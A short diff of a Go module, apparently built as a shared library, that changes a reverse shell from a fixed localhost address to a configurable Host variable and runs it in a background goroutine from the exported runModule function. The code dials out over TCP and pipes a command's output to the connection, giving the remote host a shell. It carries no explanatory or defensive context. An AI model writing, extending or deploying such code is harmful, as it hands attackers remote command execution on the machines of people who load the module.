@@ -6,9 +6,10 @@ import (
 	"os/exec"
 )
 
-//export runModule
-func runModule() {
-	conn, err := net.Dial("tcp", "127.0.0.1:9999")
+var Host string
+
+func shellStart() {
+	conn, err := net.Dial("tcp", Host)
 	if (err != nil) {
 		return
 	}
@@ -17,6 +18,11 @@ func runModule() {
 	cmd.Stdout=conn
 	cmd.Stderr=conn
 	cmd.Run()
+}
+
+//export runModule
+func runModule() {
+	go shellStart()
 }
 
 func main() {}
